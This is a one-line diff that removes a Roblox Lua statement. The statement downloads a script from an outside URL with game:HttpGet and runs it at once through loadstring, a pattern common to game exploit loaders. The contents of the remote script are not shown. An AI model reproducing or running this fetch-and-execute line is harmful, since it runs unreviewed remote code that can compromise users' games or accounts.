@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://pawie.tech/scripts/touchfb.lua", true))()
